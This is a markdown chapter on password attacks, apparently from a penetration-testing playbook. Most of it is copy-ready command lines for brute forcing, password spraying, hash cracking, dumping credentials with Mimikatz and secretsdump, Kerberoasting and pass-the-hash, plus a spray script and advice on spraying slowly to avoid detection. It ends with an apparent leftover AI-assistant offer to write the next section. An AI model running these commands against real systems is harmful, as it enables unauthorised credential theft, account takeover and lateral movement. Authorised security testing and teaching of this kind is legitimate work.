# 05 — Password Attacks

## Philosophy

Passwords remain one of the **most common entry points during penetration tests**. Weak credential policies, password reuse, and predictable patterns frequently allow attackers to move from limited access to **full domain compromise**.

Password attacks focus on:

* discovering valid usernames
* guessing weak passwords
* cracking stored credential hashes
* reusing compromised credentials across services

A single recovered password often becomes the **starting point for privilege escalation and lateral movement**.

---

# Attack Surface Overview

### Authentication Mechanisms

Common services requiring authentication include:

* SSH
* FTP
* SMB
* RDP
* HTTP login forms
* databases
* VPN gateways

### Credential Storage Locations

Sensitive credential material may be stored in:

* `/etc/passwd`
* `/etc/shadow`
* Windows SAM database
* LSASS memory
* application configuration files
* database credential tables

### Common Hash Types

Password hashes encountered during engagements include:

* NTLM
* LM
* MD5
* SHA1 / SHA256 / SHA512
* bcrypt
* Kerberos tickets

### Password Policy Considerations

Understanding policy behavior is critical:

* complexity requirements
* password reuse
* lockout thresholds
* rotation schedules

---

# Password Attack Workflow

```
Identify Authentication Targets
        ↓
Gather Usernames
        ↓
Select Attack Technique
        ↓
Execute Attack
        ↓
Validate Credentials
        ↓
Reuse Credentials Across Services
```

### Attack Techniques

| Technique         | Description                             |
| ----------------- | --------------------------------------- |
| Brute Force       | Try every password combination          |
| Password Spraying | Test one password against many accounts |
| Hash Cracking     | Crack password hashes offline           |

---

# Command Arsenal

## Online Brute Force Attacks

A widely used brute force tool is
Hydra.

### SSH

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
```

### FTP

```bash
hydra -L users.txt -P pass.txt ftp://192.168.1.10
```

### HTTP Login Form

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
192.168.1.10 \
http-post-form \
"/login.php:user=^USER^&pass=^PASS^:F=Invalid"
```

---

## Parallel Brute Force

Using
Medusa.

```bash
medusa -h 192.168.1.10 -U users.txt -P pass.txt -M ssh
```

---

## High-Speed Network Cracking

Using
Ncrack.

```bash
ncrack -p ssh://192.168.1.10:22 -U users.txt -P pass.txt
```

---

# Password Spraying

Password spraying tests **one password across many accounts** to avoid lockouts.

### SMB Spraying

Using
CrackMapExec.

```bash
crackmapexec smb 192.168.1.10-20 \
-u users.txt \
-p 'Spring2026!' \
--continue-on-success
```

---

### Kerberos Password Spraying

Using
Kerbrute.

```bash
kerbrute passwordspray \
-d domain.local \
users.txt \
'Password123' \
--dc 192.168.1.10
```

---

### Slow Spray with Hydra

```bash
hydra -L users.txt \
-p 'Winter2026!' \
-t 1 \
-s 445 \
smb://192.168.1.10
```

---

# Hash Cracking

Offline cracking is performed using
Hashcat and
John the Ripper.

---

## Identify Hash Type

```bash
hashid '$6$...'
```

```bash
hash-identifier
```

---

## Crack with John

```bash
john --format=sha512crypt hashes.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

Show cracked results:

```bash
john --show hashes.txt
```

---

## Crack with Hashcat

### NTLM Hashes

```bash
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt
```

### Rule-Based Cracking

```bash
hashcat -m 1000 -a 0 ntlm.txt \
/usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule
```

---

## Mask Attacks

Example: brute-force 8-digit numbers.

```bash
hashcat -m 0 -a 3 md5.txt ?d?d?d?d?d?d?d?d
```

---

# Password List Generation

## Generate Custom Wordlists

Using
Crunch.

```bash
crunch 6 8 0123456789 -o 6-8-digits.txt
```

```bash
crunch 8 8 -t pass@@@@ -o custom.txt
```

---

## Website Wordlist Generation

Using
CeWL.

```bash
cewl http://192.168.1.10 -d 2 -m 5 -w cewl.txt
```

---

## Personal Wordlist Creation

Using
CUPP.

```bash
python3 cupp.py -i
```

---

# Credential Dumping (Post-Exploitation)

## Windows Credential Extraction

Using
Mimikatz.

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

---

## Linux Shadow File

```bash
cat /etc/shadow
```

---

## Dump Windows SAM Database

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
```

Extract hashes:

```bash
secretsdump.py -sam sam.save -system system.save LOCAL
```

---

# Advanced Password Attacks

## Kerberoasting

Extract service tickets:

```bash
impacket-GetUserSPNs \
-request \
-dc-ip 192.168.1.10 \
domain.local/user:password
```

Crack using hashcat:

```
hashcat -m 13100 ticket.txt wordlist.txt
```

---

## AS-REP Roasting

```bash
impacket-GetNPUsers \
-dc-ip 192.168.1.10 \
domain.local/ \
-usersfile users.txt \
-format hashcat
```

---

## Pass-the-Hash

Authenticate using NTLM hashes instead of passwords.

```bash
crackmapexec smb 192.168.1.10 \
-u administrator \
-H 8846f7eaee8fb117ad06bdd830b7586c \
-x whoami
```

---

# Automation Techniques

## Password Spray Script

```bash
#!/bin/bash

USERS_FILE=$1
PASSWORD=$2

for ip in $(cat targets.txt); do
    echo "[*] Testing $ip"

    crackmapexec smb $ip \
    -u $USERS_FILE \
    -p $PASSWORD \
    --continue-on-success >> spray_results.txt
done
```

---

## Hash Cracking Pipeline

```bash
secretsdump.py -system SYSTEM -sam SAM LOCAL -outputfile hashes
```

Extract NTLM hashes:

```bash
cat hashes | cut -d: -f3-4 > ntlm.txt
```

Crack hashes:

```bash
hashcat -m 1000 ntlm.txt \
/usr/share/wordlists/rockyou.txt \
-r /usr/share/hashcat/rules/best64.rule
```

---

# Attack Path Identification

### Credential Reuse

Recovered credentials should always be tested across:

* SSH
* SMB
* RDP
* VPN
* web portals

Password reuse frequently enables **lateral movement**.

---

### Privilege Escalation via Credentials

If a compromised user has elevated privileges:

* check `sudo -l`
* check group memberships
* test administrative login paths

---

# Common Mistakes

### Ignoring Account Lockouts

Test lockout thresholds before brute forcing.

### Not Using Hashcat Rules

Rules dramatically increase cracking success.

### Ignoring Default Credentials

Always test:

```
admin:admin
root:toor
administrator:password
```

### Spraying Too Fast

Use delays to avoid detection and lockouts.

---

# Professional Tips

### Build Targeted Wordlists

Use:

* employee names
* company branding
* seasonal passwords

### Use Continue-on-Success

Many tools support collecting multiple credentials in one run.

### Prioritize High-Value Accounts

Focus first on:

* domain administrators
* service accounts
* backup operators

---

# Output Organization

```
05-Password-Attacks/

├── README.md
├── wordlists
│   ├── custom
│   └── rockyou.txt
│
├── hashes
│   ├── target_hashes.txt
│   └── john.pot
│
├── results
│   ├── cracked_hashes.txt
│   ├── valid_creds.csv
│   └── spray_logs
│
└── rules
    └── custom.rule
```

If you want, I can also **polish the next section (06 — Linux Privilege Escalation)** so the whole repo becomes a **complete professional offensive security playbook**.
